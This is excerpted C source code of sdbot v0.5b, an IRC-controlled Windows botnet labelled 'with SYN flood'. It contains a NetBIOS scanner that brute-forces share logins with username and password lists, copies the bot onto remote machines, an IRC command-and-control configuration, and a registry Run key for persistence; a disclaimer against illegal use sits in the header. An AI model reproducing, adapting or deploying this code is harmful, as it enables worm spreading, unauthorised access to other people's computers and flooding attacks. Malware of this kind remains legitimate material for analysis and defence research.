...
//   sdbot v0.5b by [sd]                  //
//                                        //
//   web: http://wintermarket.org:81/~sd  //
//                                        //
...
//     also, no part of this source       //
//     code should be used for illegal    //
//     purposes.                          //
//                                        //
////////////////////////////////////////////
...
DWORD WINAPI ScanNetBIOS(LPVOID lpvThread)
{
	...
	while (1)
	{
		...
		printf("[SCANNING] Address: %s\tPort: 139\n", szIPAddr);
		nPort = 139;
		...
		{
#ifdef DEBUG_MODE
			printf("[SCANNED] Address: %s\tPort: 139\tState: Open\n", szIPAddr);
#endif
			closesocket(Socket);
			...
			strcpy(szRemoteUNC, szRemoteName);
			EnumShare(szRemoteUNC, szRemoteShare);
			strcat(szRemoteName, "\\");
			strcat(szRemoteName, szRemoteShare);
			...
			for (nK = 0; nK < MAX_USERNAME; nK++)
			{
				...
				{
#ifdef DEBUG_MODE
					printf("[CONNECT] Remote Path: %s\tUser: %s\tPass: %s\n", NetResource.lpRemoteName, lpszUserName[nK], lpszPassword[nL]);
#endif

					/* establish silent netbios connection with remote system */
					dwRet = WNetAddConnection2(&NetResource, lpszPassword[nL], lpszUserName[nK], dwFlags);
					if (dwRet == NO_ERROR)
					{
						/* construct strings for copying file and copy file*/
						/* if file copy is success, attempt remote execution */
						strcpy(szNewName, NetResource.lpRemoteName);
						strcat(szNewName, "\\");
						strcat(szNewName, lpszFileName);
#ifdef DEBUG_MODE
						printf("[COPYING] From: %s\tTo: %s\n", szFullPath, szNewName);
#endif
						bCopy = CopyFile(szFullPath, szNewName, FALSE);
						if (bCopy == TRUE)
						{
							if (lpszUserName[nK] == NULL)
							{
								if (lpszPassword[nL] == NULL)
								{
									printf("net use * \"%s\" \"\" /user:\"\"\n", szRemoteName);
								}
								else
								{
									printf("net use * \"%s\" \"%s\" /user:\"\"\n", szRemoteName, lpszPassword[nL]);
								}
							}
							else
							{
								printf("net use * \"%s\" \"%s\" /user:\"%s\"\n", szRemoteName, lpszPassword[nL], lpszUserName[nK]);
							}
						}
						...
						{
#ifdef DEBUG_MODE
							printf("[DISCONNECT] Remote Path: %s\tUser: %s\tPass: %s\n", NetResource.lpRemoteName, lpszUserName[nK], lpszPassword[nL]);
#endif
...
#ifdef DEBUG_MODE
						printf("[DISCONNECTED] Remote Path: %s\tUser: %s\tPass: %s\n", NetResource.lpRemoteName, lpszUserName[nK], lpszPassword[nL]);
#endif
					}
				}
			}
...
#ifdef DEBUG_MODE
			printf("[SCANNED] Address: %s\tPort: 139\tState: Closed\n", szIPAddr);
#endif
			closesocket(Socket);
		}
		Sleep(512);
...
#define vername "sdbot 0.5b with SYN flood"
...
// bot configuration
const char botid[] = "blah"; // bot id
const char password[] = "blah"; // bot password
const  int maxlogins = 1; // maximum number of simultaneous logins
const char server[] = "irc.dal.net"; // server
const  int port = 6667; // server port
const char serverpass[] = ""; // server password
const char channel[] = "#blah"; // channel that the bot should join
const char chanpass[] = ""; // channel password
const char server2[] = "irc.dal.net"; // backup server (optional)
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	...
	if (regrun) {
		...
		RegSetValueEx(key, valuename, 0, REG_SZ, (unsigned char *)&filename1, sizeof(filename) + 1);
		RegCloseKey(key);
	}
